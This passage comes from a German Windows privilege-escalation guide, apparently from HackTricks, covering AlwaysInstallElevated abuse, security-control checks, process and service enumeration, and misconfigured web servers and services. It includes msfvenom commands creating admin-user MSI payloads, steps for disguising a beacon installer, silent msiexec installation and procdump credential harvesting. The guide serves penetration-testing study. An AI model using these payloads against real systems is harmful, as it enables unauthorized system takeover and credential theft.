Prüfe die Richtlinien des tatsächlichen DC für [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) und [LDAPS channel binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), die Objekt-ACL der weitergeleiteten Identität sowie die Authentifizierungs- und Identitätswechselstufen der ausgewählten COM-Klasse. Anmeldetyp und Anmeldeinformationskontext des Aufrufers sind wichtig: Eine WinRM-Sitzung kann sich anders verhalten als eine interaktive Anmeldung oder eine Anmeldung mit neuen Anmeldeinformationen. Auch Firewall-/OXID-Routing und installierte Updates können das Ergebnis beeinflussen. Betrachte eine permissive Richtlinie oder eine passende ACL als prüfenswert; passive Enumeration sollte keine COM-Coercion, Relay-Authentifizierung oder Verzeichnisschreibvorgänge auslösen. Ein shadow credential für ein Computerkonto kann zu einem Machine-Ticket führen und nur dann, wenn dieses Konto über die erforderlichen Verzeichnisreplikationsberechtigungen verfügt, zu einem separaten DCSync-Angriffspfad.

Finde den **Exploit unter** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Weitere Informationen zum Ablauf des Angriffs findest du unter [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Wenn** diese 2 Registrierungseinträge **aktiviert** sind (Wert ist **0x1**), können Benutzer mit beliebigen Berechtigungen `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit-Payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Wenn du über eine Meterpreter-Sitzung verfügst, kannst du diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwende den Befehl `Write-UserAddMSI` von power-up, um im aktuellen Verzeichnis eine Windows-MSI-Datei zur Rechteausweitung zu erstellen. Dieses Skript gibt ein vorkompiliertes MSI-Installationsprogramm aus, das zum Hinzufügen eines Benutzers/einer Gruppe auffordert (du benötigst also GIU-Zugriff):

```
Write-UserAddMSI
```

Führen Sie einfach die erstellte Binärdatei aus, um Ihre Berechtigungen zu erweitern.

### MSI Wrapper

Lesen Sie dieses Tutorial, um zu erfahren, wie Sie mit diesem Tool einen MSI Wrapper erstellen. Beachten Sie, dass Sie eine „**.bat**“-Datei einbinden können, wenn Sie **nur** **Befehlszeilen ausführen** möchten.


{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- **Erstellen** Sie mit Cobalt Strike oder Metasploit ein **neues Windows-EXE-TCP-Payload** unter `C:\privesc\beacon.exe`
- Öffnen Sie **Visual Studio**, wählen Sie **Create a new project** und geben Sie „installer“ in das Suchfeld ein. Wählen Sie das Projekt **Setup Wizard** aus und klicken Sie auf **Next**.
- Geben Sie dem Projekt einen Namen, z. B. **AlwaysPrivesc**, verwenden Sie `C:\privesc` als Speicherort, wählen Sie **place solution and project in the same directory** und klicken Sie auf **Create**.
- Klicken Sie so lange auf **Next**, bis Sie zu Schritt 3 von 4 gelangen (Dateien zum Einschließen auswählen). Klicken Sie auf **Add** und wählen Sie das soeben erstellte Beacon-Payload aus. Klicken Sie anschließend auf **Finish**.
- Markieren Sie das Projekt **AlwaysPrivesc** im **Solution Explorer** und ändern Sie unter **Properties** den Wert von **TargetPlatform** von **x86** in **x64**.
  - Sie können weitere Eigenschaften ändern, z. B. **Author** und **Manufacturer**, damit die installierte App legitimer wirkt.
- Klicken Sie mit der rechten Maustaste auf das Projekt und wählen Sie **View > Custom Actions**.
- Klicken Sie mit der rechten Maustaste auf **Install** und wählen Sie **Add Custom Action**.
- Doppelklicken Sie auf **Application Folder**, wählen Sie die Datei **beacon.exe** aus und klicken Sie auf **OK**. Dadurch wird sichergestellt, dass das Beacon-Payload sofort nach dem Start des Installers ausgeführt wird.
- Ändern Sie unter **Custom Action Properties** den Wert von **Run64Bit** in **True**.
- Erstellen Sie es schließlich mit **Build**.
  - Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stellen Sie sicher, dass die Plattform auf x64 eingestellt ist.

### MSI-Installation

So führen Sie die **Installation** der schädlichen `.msi`-Datei im **Hintergrund** aus:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Um diese Sicherheitslücke auszunutzen, kannst du Folgendes verwenden: _exploit/windows/local/always_install_elevated_

## Antivirus und Detektoren

### Überwachungseinstellungen

Diese Einstellungen legen fest, was **protokolliert** wird. Daher solltest du ihnen Beachtung schenken.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: Es ist interessant zu wissen, wohin die Logs gesendet werden.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** wurde für die **Verwaltung lokaler Administratorpasswörter** entwickelt. Dabei wird sichergestellt, dass jedes Passwort auf Computern, die einer Domäne beigetreten sind, **einzigartig, zufällig und regelmäßig aktualisiert** wird. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern eingesehen werden, denen über ACLs ausreichende Berechtigungen erteilt wurden.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn WDigest aktiv ist, werden **Passwörter im Klartext in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA-Schutz

Ab **Windows 8.1** führte Microsoft einen erweiterten Schutz für die Local Security Authority (LSA) ein, um Versuche nicht vertrauenswürdiger Prozesse zu **blockieren**, ihren **Speicher auszulesen** oder Code einzuschleusen und so das System weiter abzusichern.\
[**Weitere Informationen zum LSA-Schutz gibt es hier**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Es soll auf einem Gerät gespeicherte Anmeldedaten vor Bedrohungen wie Pass-the-Hash-Angriffen schützen. [**Weitere Informationen zu Credential Guard finden Sie hier.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Zwischengespeicherte Anmeldedaten

**Domänenanmeldedaten** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheitspaket authentifiziert werden, werden in der Regel Domänenanmeldedaten für den Benutzer erstellt.\
[**Weitere Informationen zu zwischengespeicherten Anmeldedaten**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Du solltest prüfen, ob eine der Gruppen, denen du angehörst, über interessante Berechtigungen verfügt.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Gruppen mit Privilegien

Wenn du **Mitglied einer privilegierten Gruppe bist, kannst du möglicherweise deine Berechtigungen erweitern**. Erfahre hier mehr über privilegierte Gruppen und wie du sie missbrauchen kannst, um deine Berechtigungen zu erweitern:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-Manipulation

**Erfahre mehr** darüber, was ein **Token** ist, auf dieser Seite: [**Windows-Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sieh dir die folgende Seite an, um **mehr über interessante Tokens** zu erfahren und wie du sie missbrauchen kannst:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen

```bash
qwinsta
klist sessions
```

### Home-Verzeichnisse

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Kennwortrichtlinie

```bash
net accounts
```

### Inhalt der Zwischenablage abrufen

```bash
powershell -command "Get-Clipboard"
```

## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Prüfe zunächst beim Auflisten der Prozesse **auf Passwörter in der Befehlszeile des Prozesses**.\
Prüfe, ob du **eine laufende Binärdatei überschreiben kannst** oder Schreibberechtigungen für den Ordner der Binärdatei hast, um mögliche [**DLL Hijacking attacks**](dll-hijacking/index.html) auszunutzen:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Prüfe immer, ob [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) laufen, da du sie zur Privilegienausweitung missbrauchen könntest.

Ein Debugger-Listener kann nur kurzzeitig aktiv sein. Dass er in einer einzelnen passiven Portaufnahme nicht zu sehen ist, beweist daher nicht, dass er nie erreichbar war. Ordne jeden beobachteten Listener seiner PID, dem Prozesseigentümer und der Frage zu, ob der Benutzer mit niedrigeren Rechten ihn erreichen kann. Ein Anwendungsname oder Debug-Flag allein belegt keine Codeausführung über Benutzergrenzen hinweg. Halte die routinemäßige Enumeration passiv und sende keine Debugger-Befehle.

**Berechtigungen der Prozess-Binärdateien prüfen**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Überprüfen der Berechtigungen der Ordner der Prozess-Binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort-Verzeichnisse für dynamische Präprozessoren

Snort 2 kann gemeinsam genutzte Bibliotheken aus einem `dynamicpreprocessor directory` laden, das in der mit `snort.exe -c <config>` ausgewählten Konfiguration festgelegt ist. Prüfe bei einer geplanten Aufgabe oder einem Dienst, der Snort unter einem anderen Konto ausführt, genau diese Konfiguration und die ACL des angegebenen Modulverzeichnisses. Wenn dein Token dort Dateien erstellen kann, ist dieser Pfad ein Kandidat für eine Prüfung auf Codeausführung, wenn die Aufgabe oder der Dienst das nächste Mal Module lädt. Überprüfe die effektiven Berechtigungen des Ausführungskontos, die aktive Konfiguration, die Modulkompatibilität sowie etwaige Verweigerungs- oder Freigabebeschränkungen; ein beschreibbares Verzeichnis allein belegt keine Rechteausweitung. Die [Dokumentation zu Snorts dynamischen Präprozessoren](https://www.snort.org/documents/dpx-readme) beschreibt das Laden von Modulen zur Laufzeit.

### Privilegierter Webdienst mit beschreibbarem Dokumentstammverzeichnis

Vergleiche bei einer Windows-Apache-Installation den Pfad der ausführbaren Datei des Dienstes und das Ausführungskonto mit dem `DocumentRoot` in der aktiven `httpd.conf`. Prüfe bei einem herkömmlichen XAMPP-Layout `C:\xampp\apache\conf\httpd.conf` und die ACL des darin festgelegten Dokumentstammverzeichnisses, häufig `C:\xampp\htdocs`. Wenn ein Benutzer mit geringeren Berechtigungen in diesem Verzeichnis Dateien erstellen kann, während Apache als `LocalSystem` ausgeführt wird, kann serverseitige Codeausführung die Privilegiengrenze des Hosts überschreiten. Vergewissere dich, dass der Dienst läuft, dass genau dieser Pfad ausgeliefert wird und dass ein serverseitiger Handler den Dateityp verarbeitet; ein beschreibbares Stammverzeichnis allein belegt lediglich, dass Dateien erstellt werden können. Prüfe die ACLs, ohne eine Testdatei zu schreiben:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Bei einer herkömmlichen WAMP-Installation kann der Dienst auf eine versionsspezifische `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (oder bei einem 32-Bit-Layout auf `C:\wamp\...`) verweisen. Die Konfiguration befindet sich daneben unter `conf\httpd.conf`, und als Standardstammverzeichnis dient `C:\wamp64\www` oder `C:\wamp\www`. Prüfe gemeinsam das genaue Dienstabbild, die Identität, unter der es ausgeführt wird, das effektive `DocumentRoot` (einschließlich der Auflösung von `${INSTALL_DIR}` und Virtual-Host-Überschreibungen) und die ACL des Stammverzeichnisses. Ein beschreibbares WAMP-Verzeichnis belegt nicht, dass Apache als `SYSTEM` ausgeführt wird oder die übermittelte Datei ausführt. [Apache dokumentiert, wie ein Windows-Dienst seine Konfiguration auswählt](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Beschreibbares IIS-Stammverzeichnis und Netzwerkidentität des Anwendungspools

Ordne bei IIS ein beschreibbares physisches Verzeichnis in `applicationHost.config` einer **aktiven Site/Anwendung** zu und ermittle anschließend den konfigurierten Pool und den serverseitigen Handler. In einem bereitgestellten Verzeichnis abgelegter Code wird nur dann als Pool ausgeführt, wenn IIS diesen Dateityp verarbeitet und die Route erreichbar ist. Prüfe die effektiven Berechtigungen des aktuellen Benutzers zum Erstellen von Dateien, den Laufzeitstatus der Site, den Handler und pfadspezifische Überschreibungen, bevor du ein beschreibbares Verzeichnis als Codeausführung einstufst.

Die dynamische ASP.NET-Kompilierung eröffnet einen separaten Prüfpfad: generierte Dateien im Kompilierungsverzeichnis der Anwendung. Standardmäßig befindet sich dieses unter dem relevanten .NET-Framework-Installationsverzeichnis in einem Ordner namens `Temporary ASP.NET Files`; `<compilation tempDirectory>` der Anwendung kann den Speicherort jedoch ändern. [Microsoft dokumentiert den Speicherort und die anwendungsspezifischen Unterverzeichnisse](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) und [empfiehlt getrennte Kompilierungsverzeichnisse, wenn Anwendungspools einander nicht vertrauen](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Kann ein Token mit geringeren Berechtigungen generierten Quellcode im Cache der **konkreten** Anwendung ändern, ermittle, ob diese Anwendung ihn unter einer privilegierteren [Worker-Prozessidentität](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) erneut kompiliert. Eine Datei- oder Verzeichnis-ACL allein belegt keine Codeausführung: Ordne den Cache der aktiven Anwendung, dem effektiven Token und der ACL, den Kompilierungseinstellungen, der Prozessidentität und dem Zeitpunkt einer möglichen Neukompilierung zu. Prüfe Metadaten nur lesend; löse während der Enumeration keine Kompilierung aus und ändere keine Cache-Dateien.

Ein IIS-Pool, der als `ApplicationPoolIdentity` oder `NetworkService` konfiguriert ist, authentifiziert sich bei Domänenressourcen häufig als **Computerkonto des Hosts**, auch wenn sein lokales Token nur geringe Berechtigungen hat. `LocalSystem` verfügt lokal bereits über hohe Berechtigungen und verwendet im Netzwerk ebenfalls das Computerkonto; `LocalService` präsentiert normalerweise anonyme Netzwerkzugangsdaten. Ein Pool vom Typ `SpecificUser` verwendet stattdessen das dafür konfigurierte Konto. [Microsoft dokumentiert diese Identitätstypen](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) und [die Netzwerkidentität von Anwendungspools](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Eine nicht angegebene Identitätseinstellung kann die Pool-Standardwerte übernehmen, die sich je nach IIS-Generation unterscheiden. Ermittle daher die effektive Konfiguration, statt anhand des Poolnamens zu raten. Erreicht die Codeausführung einen Pool mit Netzwerkidentität des Computerkontos, prüfe die Verzeichnisrechte **dieses konkreten Computers**. [DCSync](../active-directory-methodology/dcsync.md) erfordert Replikationsrechte auf dem Domänennamenskontext; ein Computerkonto-Ticket oder eine Hostrolle allein belegen diese Rechte nicht. Bei der passiven Enumeration sollten Konfiguration und ACLs geprüft werden, ohne eine Datei hochzuladen, eine Netzwerkauthentifizierung auszulösen oder Tickets anzufordern.

Bei einem lesbaren ASP.NET-Handler, der einen Hilfsprozess startet, verfolge jeden aus einer Anfrage stammenden Wert durch Authentifizierung, Entschlüsselung, Validierung und Befehlserstellung. Ein Handler, der ein dekodiertes Token an `ProcessStartInfo("cmd", "/c ...")` anhängt, kann es ermöglichen, dass Shell-Metazeichen den Befehl verändern; [Microsoft dokumentiert die Sonderzeichen von `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Stelle fest, ob ein nicht vertrauenswürdiger Aufrufer den dekodierten Wert tatsächlich beeinflussen und den Handler erreichen kann. Ermittle außerdem die effektive Identität des Anwendungspools oder des impersonierten Benutzers sowie die Identität des untergeordneten Prozesses. Eine lesbare Quellcodezeile, ein Listener auf localhost oder eine Schwachstelle im Token-Format allein belegen keine Ausführung privilegierter Befehle. Prüfe Quellcode und Poolkonfiguration, ohne während der passiven Enumeration gefälschte Anfragen zu senden oder den Hilfsprozess auszuführen.

Bei einem PHP-Dienst unter Windows kann ein anfragegesteuerter Pfad, der an [`include` oder `require`](https://www.php.net/manual/en/function.include.php) übergeben wird, eine PHP-Datei auswerten, die ein Benutzer mit geringeren Rechten beschreiben kann, und zwar unter der Identität des Workers. Bestätige, dass die Anfrage diese Anweisung erreichen kann, der aufgelöste Pfad auf eine Datei verweist, die der Benutzer mit geringeren Rechten ändern und der Worker lesen kann, geltende PHP-Pfadbeschränkungen das Einbinden erlauben und der Worker tatsächlich mit höheren Berechtigungen ausgeführt wird. Ein Listener auf Loopback oder eine beschreibbare Datei allein belegt diese Kette nicht. Prüfe Quellcode, Dienstidentität und Datei-ACLs, ohne den Endpunkt während der passiven Enumeration aufzurufen.

### Passwortsuche im Arbeitsspeicher

Mit **procdump** aus Sysinternals kannst du einen Speicherauszug eines laufenden Prozesses erstellen. Dienste wie FTP haben **Zugangsdaten im Klartext im Arbeitsspeicher**. Versuche, den Speicher auszulesen und die Zugangsdaten zu ermitteln.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Unsichere GUI-Apps

**Als SYSTEM ausgeführte Anwendungen können es einem Benutzer ermöglichen, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: „Windows-Hilfe und Support“ (Windows + F1), nach „Eingabeaufforderung“ suchen und auf „Klicken, um die Eingabeaufforderung zu öffnen“ klicken

### Import privilegierter Projektdateien

Eine Anwendung, die Projekte automatisch aus einem Drop-Verzeichnis öffnet, in das ein Benutzer mit niedrigeren Rechten schreiben kann, überschreitet unter dem Konto des Importers eine Vertrauensgrenze für Eingaben. Prüfen Sie den **genauen beschreibbaren Pfad**, den Prozess oder Task, der ihn öffnet, dessen effektive Identität und die Parser-Version. Ein [historisches Problem beim Öffnen/Wiederherstellen von Ghidra-Projekten](https://github.com/NationalSecurityAgency/ghidra/issues/71) ermöglichte XML External Entities in Projektmetadaten; eine Netzwerk-Entity unter Windows konnte eine Authentifizierung durch das importierende Konto auslösen, wenn die [Richtlinien für ausgehendes SMB und NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) dies erlauben. Das ist ein Ansatzpunkt für die Offenlegung von Zugangsdaten, kein unmittelbarer Administratorzugriff: Die Antwort muss über einen separaten autorisierten oder verwundbaren Pfad nutzbar sein, und aktuelle Builds müssen anhand ihres tatsächlichen Patch-Status bewertet werden. Öffnen Sie während der passiven Enumeration kein präpariertes Projekt; prüfen Sie den Import-Workflow und die ACLs.

## Dienste

Das Recht [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) am Service Control Manager (SCM)-Objekt ist von den Rechten für einen bestehenden Dienst getrennt. Eine erfolgreiche, schreibgeschützte [`OpenSCManager`-Zugriffsanfrage](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) für dieses Recht ist ein Prüfhinweis, aber kein Beweis dafür, dass ein neuer Dienst ausgeführt werden kann. [`CreateService` gibt ein Handle zurück](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew), das bei der Erstellung mit den angeforderten Dienstrechten versehen wird; beim späteren erneuten Öffnen des Dienstes erfolgt eine separate Zugriffsprüfung, die fehlschlagen kann, obwohl das ursprüngliche Handle verwendet werden könnte. Prüfen Sie das effektive lokale oder Remote-Token, die gewährten Handle-Rechte, das Dienstkonto, die Startkonfiguration und den ausführbaren Pfad getrennt. Erstellen oder starten Sie während der passiven Enumeration keinen Dienst.

Prüfen Sie bei einem Remote-Pfad zur Dienstinstallation diese SCM-Rechte zusammen mit einer Freigabe auf dem Ziel, in die **dieselbe Netzwerkanmeldung** schreiben kann, deren zugrunde liegenden NTFS-ACLs und einem lokalen ausführbaren Pfad, den das Dienstkonto ausführen kann. Ein Nicht-Administratorkonto kann diese Grenze überschreiten, wenn ungewöhnlich weitreichende SCM-Rechte und ein Pfad zur Dateiplatzierung vorhanden sind; eine administrative Freigabe ist keine zwingende Voraussetzung. Schreibzugriff auf eine Freigabe allein oder ein Hinweis auf das Recht zum Erstellen eines Dienstes über SCM allein belegt nicht, dass der neue Dienst mit einer höher privilegierten Identität gestartet werden kann.

Ein bestehender Dienst kann beim Start, beim Herunterfahren oder bei einem anderen Lebenszyklusereignis eine Hilfsdatei aufrufen, selbst wenn diese nicht in seinem `ImagePath` steht. Wird der Name der Hilfsdatei in ein Verzeichnis aufgelöst, in das ein Benutzer mit niedrigeren Rechten schreiben kann, und wird der Dienst mit einer höher privilegierten Identität ausgeführt, ist eine fehlende Hilfsdatei ein möglicher Ersatzkandidat – abhängig von weiteren Bedingungen. Bestätigen Sie den **tatsächlichen Dienstcode oder den dokumentierten Aufruf der Hilfsdatei**, den aufgelösten ausführbaren Pfad und die Suchreihenfolge, die Berechtigungen zum Erstellen von Verzeichnissen, die Dienstidentität und einen verfügbaren Auslöser für den Lebenszyklus. Ein beschreibbares Dienstverzeichnis oder eine fehlende Datei allein belegt nicht, dass der Dienst die Datei lädt; starten oder beenden Sie den Dienst bei einer passiven Prüfung nicht.

Bei einem bestehenden Dienst erlaubt [`SERVICE_START` das Übergeben von Argumenten an `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); es ist von [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) getrennt. Prüfen Sie den Dienstcode oder die dokumentierte Schnittstelle, bevor Sie das Startrecht als mehr als ein Steuerungsrecht bewerten. Falls der Dienst ein vom Aufrufer gewähltes Argument als Protokoll- oder Exportpfad verwendet, prüfen Sie die Dienstidentität, den genauen Ablauf vom Argument bis zum Schreibvorgang, Pfadbeschränkungen und die Berechtigungen der **erstellten Datei**. Ein Schreibvorgang in ein geschütztes Verzeichnis kann nur mit einem separaten privilegierten Verbraucher oder Loader, der diese Datei akzeptiert, zur Rechteausweitung führen; ein beschreibbares Protokoll oder ein Startrecht allein reicht nicht aus. Erstellen Sie bei einer passiven Bestandsaufnahme weder eine Testdatei noch starten Sie den Dienst.

Bei einem NSClient++-Monitoring-Agenten ist eine lesbare `nsclient.ini` ein **Hinweis für die Konfigurationsprüfung**: Sie kann Web-Zugangsdaten enthalten, während `boot.ini` die Konfiguration an einen anderen Ort umleiten kann. Prüfen Sie das tatsächliche Dienstkonto, den WEB-Listener und die Zugriffsrichtlinie sowie, ob die authentifizierte Rolle Einstellungen oder Skripte ändern kann. Für eine privilegierte Ausführung sind zusätzlich `CheckExternalScripts` (oder ein anderer aktivierter Ausführungspfad), ein wirksames Recht zum Registrieren oder Ändern eines Befehls und ein Auslöser erforderlich, der ihn unter der Dienstidentität ausführt. Auch ein nur an Loopback gebundener Listener kann für einen lokalen Benutzer erreichbar sein, aber Dateipfad, Passwort oder Listener allein belegen diese Rechte nicht. Prüfen Sie Metadaten und Berechtigungen, ohne Geheimnisse anzuzeigen oder während der passiven Enumeration die Web-API aufzurufen. Siehe [NSClient++-Dateiaufbau](https://nsclient.org/docs/concepts/file-layout/), [Sicherheitshinweise zu Web und Skripten](https://nsclient.org/docs/setup/securing/) und [Konfiguration externer Skripte](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Bei einem Dienst, dessen `ImagePath` auf `nssm.exe` verweist, prüfen Sie das tatsächliche Ausführungskonto des Dienstes und dessen Wert `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM speichert die untergeordnete Anwendung dort](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), während `AppDirectory` das konfigurierte Arbeitsverzeichnis ist. Prüfen Sie die ausführbare Datei des untergeordneten Prozesses und die ACLs des übergeordneten Verzeichnisses, bevor Sie die Berechtigungen des Wrappers als einzige Grenze des Dienstes betrachten. Ein lokaler WCF- oder SOAP-Endpunkt, den dieser untergeordnete Prozess bereitstellt, ist ein separater Prüfhinweis: Bestätigen Sie, dass der Benutzer mit niedrigeren Rechten den Listener erreichen kann, dass der genaue Vorgang seine Eingaben akzeptiert und dass der untergeordnete Dienstprozess den unsicheren Vorgang mit einer höher privilegierten Identität ausführt. Das Dienstkonto, eine Endpunkt-URL oder ein beschreibbarer Pfad allein beweist keine Rechteausweitung; rufen Sie bei der passiven Enumeration keine Dienstvorgänge auf.

Verfolgen Sie bei einem benutzerdefinierten WCF-Vorgang eine vom Aufrufer kontrollierte Zeichenfolge bis zu einer PowerShell-Runspace. [`Pipeline.Commands.AddScript` fügt Skripttext hinzu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), und [`Pipeline.Invoke` führt die Pipeline aus](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Eine [`netTcpBinding` mit Windows-Transportanmeldedaten](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) authentifiziert den Client; die Berechtigung, diesen **bestimmten** Vorgang aufzurufen, und die effektive Identität der Runspace müssen jedoch separat geprüft werden. Ein Pfad von Benutzereingaben eines Aufrufers mit niedrigeren Rechten zu `AddScript`, das unter einer höher privilegierten Dienstidentität ausgeführt wird, ist eine Codeausführungsgrenze; ein lauschender Port, ein authentifizierter Client oder eine ungenutzte Methode in einer nicht zugehörigen Assembly allein ist kein Beweis. Prüfen Sie den bereitgestellten Dienst, den Vertrag, die Autorisierung und die Einstellungen zur Identitätsübernahme statisch, ohne während der Enumeration den Endpunkt aufzurufen.

Mit Service Triggers kann Windows einen Dienst starten, wenn bestimmte Bedingungen eintreten (Aktivität an Named Pipes/RPC-Endpunkten, ETW-Ereignisse, IP-Verfügbarkeit, Geräteanschluss, GPO-Aktualisierung usw.). Auch ohne SERVICE_START-Rechte können Sie privilegierte Dienste oft durch Auslösen ihrer Trigger starten. Hier finden Sie Techniken zur Enumeration und Aktivierung:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio Diagnostic Collector Service

Visual-Studio-Installationen mit C/C++-Tools können `VSStandardCollectorService150` enthalten, einen Diagnosedienst, der für die Ausführung als `LocalSystem` konfiguriert ist. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) nutzte eine Junction und eine Race Condition mit einem Object-Manager-Link, um eine DACL-Zurücksetzung des Dienstes umzuleiten. Für die demonstrierte Rechteausweitung war außerdem ein nutzbarer Reparaturpfad für das Visual Studio Setup WMI Provider MSI sowie dessen Ziel `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` erforderlich. Die Komponente wurde im Januar 2024 behoben.

Prüfen Sie bei einer passiven Triage das Konto und den Binärpfad dieses Dienstes, ob der Pfad zum Setup-WMI-Compiler vorhanden ist und den Patch-Status der installierten Komponente. Ein Diensteintrag, eine Visual-Studio-Produktversion oder eine Compilerdatei allein belegt nicht, dass der Host verwundbar ist. Für die Prüfung müssen weder der Dienst gestartet noch eine Reparatur ausgeführt werden.

Rufen Sie eine Liste der Dienste ab:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Berechtigungen

Sie können **sc** verwenden, um Informationen zu einem Dienst abzurufen.

```bash
sc qc <service_name>
```

